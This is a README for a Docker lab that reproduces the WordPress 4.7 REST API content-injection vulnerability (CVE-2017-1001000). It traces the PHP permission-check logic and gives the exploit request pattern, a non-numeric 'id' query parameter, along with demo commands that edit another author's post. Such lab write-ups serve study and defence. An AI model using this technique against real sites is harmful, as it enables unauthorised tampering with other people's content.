# docker-wordpress-content-injection

https://www.cvedetails.com/cve/CVE-2017-1001000/

## Install

```bash
docker-compose up
# In another terminal
./load_db.sh
```

* Open [http://127.0.0.1:8080/wp-admin/index.php](http://127.0.0.1:8080/wp-admin/index.php)
* Check Wordpress version (should be 4.7 or 4.7.1): W (top left) > About Wordpress
* Play with the API using the scripts `get_posts.sh` and `create_post.sh`

# Exploit

The requests are handled in `wordpress/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php`
[line 80](https://github.com/Vayel/docker-wordpress-content-injection/blob/master/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L80).

The route needs a post id in the url:

```bash
./get_post.sh 10
```

If the id is not numeric, the API returns an error because the url does not match the regex:

```bash
./get_post.sh 10ABC
```

If a query param `id` is specified, its value overrides the one in the url body:

```bash
./get_post_query_param.sh 10 11
# The obtained id is 11 and not 10
```

**But if the query param id is not numeric, no errors are raised:**

```bash
./get_post_query_param.sh 10 11ABC
```

Now, let's take the request `POST /wp-json/wp/v2/posts/10?id=11ABC` and look at
the route to [update a post](https://github.com/Vayel/docker-wordpress-content-injection/blob/master/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L93):

```php
// wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L93

register_rest_route( $this->namespace, '/' . $this->rest_base . '/(?P<id>[\d]+)', array(
    // ... 
    array(
        'methods'             => WP_REST_Server::EDITABLE,
        'callback'            => array( $this, 'update_item' ),
        'permission_callback' => array( $this, 'update_item_permissions_check' ),
        'args'                => $this->get_endpoint_args_for_item_schema( WP_REST_Server::EDITABLE ),
    ),
    // ...
) );
```

Before performing the update, the function [`wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php:update_item_permissions_check`](https://github.com/Vayel/docker-wordpress-content-injection/blob/master/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L589)
is called:

```php
// wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L589

public function update_item_permissions_check( $request ) {
    // Because we sent the id in the query param, $request['id'] == "11ABC"
    $post = get_post( $request['id'] );
    $post_type = get_post_type_object( $this->post_type );

    // Surprisingly, if $post == null, the function does not return an error
    if ( $post && ! $this->check_update_permission( $post ) ) {
        return new WP_Error( 'rest_cannot_edit', __( 'Sorry, you are not allowed to edit this post.' ), array( 'status' => rest_authorization_required_code() ) );
    }
    if ( ! empty( $request['author'] ) && get_current_user_id() !== $request['author'] && ! current_user_can( $post_type->cap->edit_others_posts ) ) {
        return new WP_Error( 'rest_cannot_edit_others', __( 'Sorry, you are not allowed to update posts as this user.' ), array( 'status' => rest_authorization_required_code() ) );
    }
    if ( ! empty( $request['sticky'] ) && ! current_user_can( $post_type->cap->edit_others_posts ) ) {
        return new WP_Error( 'rest_cannot_assign_sticky', __( 'Sorry, you are not allowed to make posts sticky.' ), array( 'status' => rest_authorization_required_code() ) );
    }
    if ( ! $this->check_assign_terms_permission( $request ) ) {
        return new WP_Error( 'rest_cannot_assign_term', __( 'Sorry, you are not allowed to assign the provided terms.' ), array( 'status' => rest_authorization_required_code() ) );
    }
    return true;
}
```

**Surprisingly, if `$post` is null, the function does not return an error.** Let's
give a look at
[`wp-includes/post.php:get_post`](https://github.com/Vayel/docker-wordpress-content-injection/blob/145c8df686c1ccf73d136d7a3c9204eeab98272a/wordpress/wp-includes/post.php#L515):

```php
// wp-includes/post.php#L515

function get_post( $post = null, $output = OBJECT, $filter = 'raw' ) {
    // $post == "11ABC"
    if ( empty( $post ) && isset( $GLOBALS['post'] ) )
        // ...
    if ( $post instanceof WP_Post ) {
        // ...
    } elseif ( is_object( $post ) ) {
        // ...
    } else { // As $post is a string, we enter here
        $_post = WP_Post::get_instance( $post );
    }
    // Because `WP_Post::get_instance( $post );` will return `false` (see explanations below)
    // the function returns `null`
    if ( ! $_post )
        return null;
    // ...
}
```

[`wp-includes/class-wp-post.php:WP_Post::get_instance`](https://github.com/Vayel/docker-wordpress-content-injection/blob/145c8df686c1ccf73d136d7a3c9204eeab98272a/wordpress/wp-includes/class-wp-post.php#L210)
will return `false` as `$post_id` is not numeric:

```php
// wp-includes/class-wp-post.php#L210

public static function get_instance( $post_id ) {
    global $wpdb;
    if ( ! is_numeric( $post_id ) || $post_id != floor( $post_id ) || ! $post_id ) {
        return false;
    }
    // ...
}
```

So `get_post` will return `null` and the permission check will pass. Then, the function
[`wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php:update_item`](https://github.com/Vayel/docker-wordpress-content-injection/blob/master/wordpress/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php#L622)
will be called with `$request['id'] = "11ABC"`:

```php
public function update_item( $request ) {
    // $request['id'] == "11ABC"
    $id = (int) $request['id'];
    // $id == 11
    // Here, `get_post` does not return `null`
    // Then, we do not enter the `if` which returns an error
    $post = get_post( $id );
    if ( empty( $id ) || empty( $post->ID ) || $this->post_type !== $post->post_type ) {
        return new WP_Error( 'rest_post_invalid_id', __( 'Invalid post ID.' ), array( 'status' => 404 ) );
    }
    // The item will be updated
    // ...
}
```

This time, the function `get_post` is called **with the id cast as an integer**. Due
to PHP [type-juggling](http://php.net/manual/en/language.types.type-juggling.php),
the variable `$id` will be equal to `11`. So `get_post` won't return `null` and `update_item`
won't return an error. **Because we have already
passed the permission check step**, the post with id `11` will be updated
even if it belongs to another user.

To conclude, it is possible for anyone to update any post of id `N` with a request such
as `POST /wp-json/wp/v2/posts/1984?id=N_then_non_numeric_chars`.

## Demo

Make sure Wordpress is running:

```bash
docker-compose up
```

Get the posts of author1:

```bash
./get_posts.sh author1
```

Update a post:

```bash
./update_post.sh 14 mysupercontent author1
# It works
```

Get the posts of author2:

```bash
./get_posts.sh author2
```

Update a post of author2 with author1:

```bash
./update_post.sh 17 mysupercontent author1
# Error: Sorry, you are not allowed to edit this post.
```

Update a post of author2 with author1 and a malicious url:

```bash
./exploit.sh 17 mysupercontent author1
# It works
```
